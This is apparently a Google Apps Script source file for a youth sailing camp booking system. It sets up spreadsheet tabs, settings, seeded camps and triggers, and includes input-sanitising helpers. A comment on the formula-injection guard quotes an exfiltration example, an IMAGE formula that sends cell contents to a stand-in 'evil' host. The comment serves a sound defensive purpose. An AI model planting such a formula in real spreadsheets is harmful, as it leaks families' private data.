/* The medical form from medical_form_id (an id, or the editor URL .../forms/d/<id>/edit). Null when blank. */
function medicalForm_(s) {
  const raw = String(s.medical_form_id || '').trim();
  if (!raw) return null;
  const m = raw.match(/\/forms\/d\/(?!e\/)([\w-]{20,})/);
  return FormApp.openById(m ? m[1] : raw);
}

/* ---------------- Admin: one-off setup and housekeeping ---------------- */

/* Run once from the Apps Script editor (choose "setup" ▸ Run). Safe to run again: it never deletes data. */
function setup() {
  const props = PropertiesService.getScriptProperties();
  let createdNow = false;
  if (!BOOKINGS_SHEET_ID && !SpreadsheetApp.getActiveSpreadsheet() && !props.getProperty('SHEET_ID')) {
    props.setProperty('SHEET_ID', SpreadsheetApp.create('BTS Bookings').getId());
    createdNow = true;
  }
  const book = ss_();
  book.setSpreadsheetTimeZone(TZ);
  Object.keys(TABS).forEach(name => {
    let sh = sh_(name);
    if (!sh) sh = book.insertSheet(SHEET_NAMES[name]);
    if (sh.getLastRow() === 0) {
      sh.getRange(1, 1, 1, TABS[name].length).setValues([TABS[name]]).setFontWeight('bold').setBackground('#e8eef3');
      sh.setFrozenRows(1);
    } else {
      // Add any new columns (e.g. signups_offline, second_group, waitlist on Camps) to the end of an existing tab.
      const have = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
      const missing = TABS[name].filter(k => have.indexOf(k) < 0);
      if (missing.length) sh.getRange(1, have.length + 1, 1, missing.length).setValues([missing]).setFontWeight('bold').setBackground('#e8eef3');
    }
  });
  // In a sheet setup just created, remove the empty default tab ("Sheet1" or its name in another language).
  // Never touches tabs in an existing spreadsheet.
  const ours = new Set(Object.values(SHEET_NAMES));
  if (createdNow) book.getSheets().filter(sh => !ours.has(sh.getName()) && sh.getLastRow() === 0).forEach(sh => book.deleteSheet(sh));

  // Plain-text columns (keeps leading zeros on phones, sort codes and account numbers)
  textCols_('Parents', ['email', 'name', 'phone', 'emergency_name', 'emergency_phone']);
  textCols_('Sailors', ['sailor_id', 'parent_email', 'first_name', 'surname', 'dob', 'rig', 'sail_number', 'club', 'image_consent', 'show_on_list']);
  textCols_('Settings', ['key', 'value', 'notes']);
  textCols_('Codes', ['email', 'code_hash']);
  textCols_('Sessions', ['token_hash', 'email']);
  textCols_('Bookings', ['booking_id', 'parent_email', 'sailor_id', 'reference']);
  textCols_('Camps', ['camp_id', 'ref_code']);
  dateCols_('Camps', ['start', 'end', 'booking_deadline']);
  dateCols_('Bookings', ['payment_due']);
  dateTimeCols_('Bookings', ['created']);
  dateTimeCols_('Sailors', ['medical_date', 'created']);

  // Dropdowns
  dropdown_('Bookings', 'status', STATUSES);
  dropdown_('Camps', 'open', ['Y', 'N']);
  dropdown_('Camps', 'second_group', ['Y', 'N']);
  dropdown_('Camps', 'waitlist', ['Y', 'N']);

  // Colour the status column
  const bsh = sh_('Bookings');
  const col = TABS.Bookings.indexOf('status') + 1;
  const rng = bsh.getRange(2, col, bsh.getMaxRows() - 1, 1);
  const colours = { 'Awaiting payment': '#fff4e5', Paid: '#e3f1ff', Confirmed: '#e6f4ea', Waitlist: '#f3e8fd', Cancelled: '#eeeeee' };
  bsh.setConditionalFormatRules(Object.keys(colours).map(k =>
    SpreadsheetApp.newConditionalFormatRule().whenTextEqualTo(k).setBackground(colours[k]).setRanges([rng]).build()));

  // Hide the sign-in housekeeping tabs
  ['Codes', 'Sessions'].forEach(n => sh_(n).hideSheet());

  seedSettings_();
  seedCamps_();

  // Triggers (recreated so there are never duplicates)
  ScriptApp.getProjectTriggers().forEach(t => {
    if (['cleanup', 'onMedicalSubmit'].includes(t.getHandlerFunction())) ScriptApp.deleteTrigger(t);
  });
  ScriptApp.newTrigger('cleanup').timeBased().everyDays(1).atHour(3).create();
  ScriptApp.newTrigger('onMedicalSubmit').forSpreadsheet(book).onFormSubmit().create();
  const medForm = medicalForm_(settings_());
  if (medForm) ScriptApp.newTrigger('onMedicalSubmit').forForm(medForm).onFormSubmit().create();
  else console.warn('medical_form_id is blank: medical forms are only picked up if the form is linked to this spreadsheet.');

  console.log('Setup complete. Bookings sheet: ' + book.getUrl());
  return 'Setup complete';
}

/* Daily: remove expired sign-in codes and sessions. */
function cleanup() {
  const now = new Date();
  withLock_(() => ['Codes', 'Sessions'].forEach(name =>
    rows_(name).filter(r => !r.expires || new Date(r.expires) < now).reverse().forEach(r => deleteRow_(name, r._row))));
}

/* Send yourself a test email using the current Settings, to check sender name and reply-to. */
function testEmail() {
  const s = settings_();
  sendMail_(Session.getEffectiveUser().getEmail(), 'BTS booking test email', emailWrap_('<p>If you can read this, emails work.</p>', s), s);
}

function seedSettings_() {
  const have = new Set(rows_('Settings').map(r => r.key));
  [
    ['sender_name', 'Beyond the Shift', 'Name shown as the sender'],
    ['reply_to', '', 'A beyondtheshift.co.uk address, so replies land in the normal inbox'],
    ['notify_emails', '', 'Who gets a copy of each booking (comma-separated), e.g. James and Kai'],
    ['bank_account_name', '', 'Shown ONLY to signed-in parents and in booking emails'],
    ['bank_sort_code', '', 'e.g. 12-34-56'],
    ['bank_account_number', '', '8 digits'],
    ['payment_note', 'Payment is due 7 days after booking, or 7 days before the camp if that is sooner. Bookings made in the final 7 days include a £20 late booking fee.', 'Extra line under the bank details'],
    ['medical_form_url', 'https://docs.google.com/forms/d/e/1FAIpQLScmOkxPW_HbmuHhicCGmGYDoMkjkoaw5JGdzGMCqr2qwxXnjg/viewform', 'The medical & image release Google Form'],
    ['medical_form_id', '', 'The medical form\'s editor URL (.../forms/d/<id>/edit) or id. setup() then watches the form directly'],
    ['medical_prefill_url', '', 'Optional override. Blank = the form link with the sailor\'s full name filled in'],
    ['medical_tab', 'Medical responses', 'Name of the tab the medical form writes to. After linking the form, rename its new "Form responses" tab to this'],
    ['medical_q_email', 'Email address', 'Only used if the form collects email addresses'],
    ['medical_q_sailor', 'Sailors full name', 'Exact question title in the form for the sailor name'],
    ['season_start', '2026-09-01', 'Medical forms dated before this are treated as last season (needs redoing)'],
    ['site_url', 'https://beyondtheshift.co.uk/', 'Base URL of the site, ending in /'],
    ['fallback_form_url', 'https://forms.gle/X7offBwNaL24wZ4t7', 'Old Google booking form, linked from the beta banner'],
  ].forEach(([k, v, n]) => { if (!have.has(k)) append_('Settings', { key: k, value: v, notes: n }); });
}

/* Upcoming BTS camps from beta/data/events.js. Payment due dates are worked out per booking (see PAY_DAYS). Capacity blank = unlimited. */
function seedCamps_() {
  const have = new Set(rows_('Camps').map(r => r.camp_id));
  const d = s => new Date(s + 'T12:00:00');
  [
    ['winterChristmas', 'Christmas Camp', '2026-12-19', '2026-12-23', 'Poole Yacht Club', 450, 'XMAS26', '2026-11-28'],
    ['winterNY1', 'New Year’s Camp #1', '2026-12-27', '2026-12-30', 'Poole Yacht Club', 360, 'NY1-26', '2026-12-06'],
    ['winterNY2', 'New Year’s Camp #2', '2026-12-31', '2027-01-03', 'Poole Yacht Club', 360, 'NY2-26', '2026-12-10'],
    ['winter9', 'Winter Series #9', '2027-02-13', '2027-02-14', 'Poole Yacht Club', 180, 'WTS9-27', '2027-01-23'],
    ['winterFebruary', 'February Training Camp', '2027-02-15', '2027-02-19', 'Poole Yacht Club', 450, 'FEB27', '2027-01-25'],
    ['winter10', 'Winter Series #10', '2027-02-20', '2027-02-21', 'Poole Yacht Club', 180, 'WTS10-27', '2027-01-30'],
  ].forEach(([id, title, start, end, venue, price, ref, deadline]) => {
    if (have.has(id)) return;
    append_('Camps', { camp_id: id, title, start: d(start), end: d(end), venue, price, ref_code: ref,
      booking_deadline: d(deadline), late_fee: 20, capacity: '', open: 'N' });
  });
}

/* ---------------- Sheet helpers ---------------- */

/* Works both ways: opened from the sheet (Extensions ▸ Apps Script), or as a standalone project,
 * where setup() creates the "BTS Bookings" sheet and remembers its id in Script Properties. */
let SS_;
function ss_() {
  if (SS_) return SS_;
  if (BOOKINGS_SHEET_ID) return (SS_ = SpreadsheetApp.openById(BOOKINGS_SHEET_ID));
  SS_ = SpreadsheetApp.getActiveSpreadsheet();
  if (!SS_) {
    const id = PropertiesService.getScriptProperties().getProperty('SHEET_ID');
    if (!id) throw new Error('No bookings sheet yet. Run setup first.');
    SS_ = SpreadsheetApp.openById(id);
  }
  return SS_;
}
function sh_(name) { return ss_().getSheetByName(SHEET_NAMES[name] || name); }
function headers_(name) { return sh_(name).getRange(1, 1, 1, sh_(name).getLastColumn()).getValues()[0]; }

function rows_(name) {
  const sh = sh_(name);
  if (sh.getLastRow() < 2) return [];
  const v = sh.getRange(1, 1, sh.getLastRow(), sh.getLastColumn()).getValues();
  const h = v.shift();
  return v.map((r, i) => { const o = { _row: i + 2 }; h.forEach((k, j) => { o[k] = typeof r[j] === 'string' ? unsafeCell_(r[j].trim()) : r[j]; }); return o; })
    .filter(o => h.some(k => o[k] !== ''));
}
function append_(name, obj) { sh_(name).appendRow(headers_(name).map(k => (obj[k] === undefined ? '' : safeCell_(obj[k])))); }
function update_(name, row, obj) {
  const h = headers_(name);
  Object.keys(obj).forEach(k => { const c = h.indexOf(k); if (c > -1) sh_(name).getRange(row, c + 1).setValue(safeCell_(obj[k])); });
}
/* Formula-injection guard (security review 17 Nov 2026). Every value the script writes goes through here, so text
 * a parent typed can never run as a formula (e.g. =IMAGE("https://evil/?"&A1) leaking the sheet) when James or Kai
 * open it. A leading apostrophe makes Sheets keep the value as plain text. Phone numbers like "+44 7700 900123"
 * contain no letters or brackets, so they are left alone. */
const RISKY_CELL = /^[=@\t\r]|^[+-].*[^0-9\s().+-]/;
function safeCell_(v) { return typeof v === 'string' && RISKY_CELL.test(v) ? "'" + v : v; }
/* If Sheets kept the apostrophe as part of the text, drop it again when reading. */
function unsafeCell_(v) { return v.charAt(0) === "'" && RISKY_CELL.test(v.slice(1)) ? v.slice(1) : v; }
function deleteRow_(name, row) { sh_(name).deleteRow(row); }
function colRange_(name, key) {
  const sh = sh_(name); const c = headers_(name).indexOf(key) + 1;
  if (!c) throw new Error(`Column ${key} missing on ${name}`);
  return sh.getRange(2, c, sh.getMaxRows() - 1, 1);
}
function textCols_(name, keys) { keys.forEach(k => colRange_(name, k).setNumberFormat('@')); }
function dateCols_(name, keys) { keys.forEach(k => colRange_(name, k).setNumberFormat('ddd d mmm yyyy')); }
function dateTimeCols_(name, keys) { keys.forEach(k => colRange_(name, k).setNumberFormat('d mmm yyyy hh:mm')); }
function dropdown_(name, key, list) {
  colRange_(name, key).setDataValidation(SpreadsheetApp.newDataValidation().requireValueInList(list, true).setAllowInvalid(false).build());
}

function withLock_(fn) {
  const lock = LockService.getScriptLock();
  if (!lock.tryLock(20000)) fail_('We are busy right now. Please try again in a moment.');
  try { const r = fn(); SpreadsheetApp.flush(); return r; } finally { lock.releaseLock(); }
}

/* ---------------- Small utilities ---------------- */

function settings_() { const o = {}; rows_('Settings').forEach(r => { if (r.key) o[r.key] = String(r.value); }); return o; }
function bank_(s) { return { account_name: s.bank_account_name || '', sort_code: s.bank_sort_code || '', account_number: s.bank_account_number || '' }; }
function campOut_(c, bookings) {
  const left = placesLeft_(c, bookings);
  const t = terms_(c, new Date());
  return { camp_id: c.camp_id, title: c.title, start: iso_(c.start), end: iso_(c.end), venue: c.venue, price: Number(c.price || 0),
    late_fee: Number(c.late_fee || 0), late_now: t.late, price_now: Number(c.price || 0) + t.fee, payment_due_now: iso_(t.due),
    places_left: left, places_label: placesLabel_(c, left), full: left === 0 };
}
/* What a booking made on `now` costs and when it must be paid (see PAY_DAYS). */
function terms_(camp, now) {
  const today = startOfDay_(now);
  const start = startOfDay_(new Date(camp.start));
  const weekBefore = addDays_(start, -PAY_DAYS);
  const late = today > weekBefore;
  const inAWeek = addDays_(today, PAY_DAYS);
  const due = late ? today : (inAWeek < weekBefore ? inAWeek : weekBefore);
  return { late, fee: late ? Number(camp.late_fee || 0) : 0, due };
}
function sailorOut_(x, s) {
  return { sailor_id: x.sailor_id, first_name: x.first_name, surname: x.surname, dob: String(x.dob), rig: String(x.rig), sail_number: String(x.sail_number),
    club: x.club, image_consent: yes_(x.image_consent), show_on_list: yes_(x.show_on_list), medical_done: medicalDone_(x, s) };
}
function fail_(msg, code) { const e = new Error(msg); e.user = true; e.code = code; throw e; }
function json_(o) { return ContentService.createTextOutput(JSON.stringify(o)).setMimeType(ContentService.MimeType.JSON); }
function hash_(s) { return Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, s, Utilities.Charset.UTF_8).map(b => ((b + 256) % 256).toString(16).padStart(2, '0')).join(''); }
function shortId_() { return Utilities.getUuid().replace(/-/g, '').slice(0, 8).toUpperCase(); }
function cleanEmail_(e) {
  e = String(e || '').trim().toLowerCase();
  /* Ordinary address characters only: no quotes, brackets or "=" a formula or an email header could use. */
  if (!/^[a-z0-9_][a-z0-9._%+'-]*@[a-z0-9-]+(\.[a-z0-9-]+)*\.[a-z]{2,}$/.test(e) || e.length > 120) fail_('Please enter a valid email address.');
  return e;
}
/* Cloudflare Turnstile check (see TURNSTILE_VERIFY). Does nothing until TURNSTILE_SECRET is set. Fails closed:
 * if Cloudflare can't be reached, no code is sent, and the error offers the booking form. */
function checkHuman_(token) {
  const secret = PropertiesService.getScriptProperties().getProperty('TURNSTILE_SECRET');
  if (!secret) return;
  const msg = "We couldn't check you're not a robot. Please refresh the page and try again.";
  if (!token) fail_(msg, 'BUSY');
  let ok = false;
  try {
    const r = UrlFetchApp.fetch(TURNSTILE_VERIFY, { method: 'post', payload: { secret, response: String(token).slice(0, 2048) }, muteHttpExceptions: true });
    ok = JSON.parse(r.getContentText()).success === true;
  } catch (err) { console.error('Turnstile check failed', err); }
  if (!ok) fail_(msg, 'BUSY');
}
function text_(v, max, required) {
  const t = String(v === undefined || v === null ? '' : v).trim().slice(0, max);
  if (required && !t) fail_(`Please fill in: ${required}.`);
  return t.replace(/^=+/, ''); // stop formulas being injected into the sheet
}
function esc_(s) { return String(s === undefined || s === null ? '' : s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
function norm_(s) { return String(s || '').toLowerCase().replace(/[^a-z]/g, ''); }
function yes_(v) { return v === true || String(v).toUpperCase() === 'Y'; }
function pick_(o, keys) { const r = {}; keys.forEach(k => { r[k] = o[k] === undefined ? '' : String(o[k]); }); return r; }
function byId_(list, key) { const m = {}; list.forEach(x => { m[x[key]] = x; }); return m; }
function iso_(d) { if (!d) return ''; const x = d instanceof Date ? d : new Date(d); return isNaN(x) ? String(d) : Utilities.formatDate(x, TZ, 'yyyy-MM-dd'); }
function niceDate_(d) { const x = d instanceof Date ? d : new Date(d); return isNaN(x) ? String(d) : Utilities.formatDate(x, TZ, 'EEE d MMM yyyy'); }
function addMinutes_(d, m) { return new Date(d.getTime() + m * 60000); }
function addDays_(d, n) { const x = new Date(d); x.setDate(x.getDate() + n); return x; }
function startOfDay_(d) { const x = new Date(d); x.setHours(0, 0, 0, 0); return x; }
function endOfDay_(d) { const x = new Date(d); x.setHours(23, 59, 59, 999); return x; }
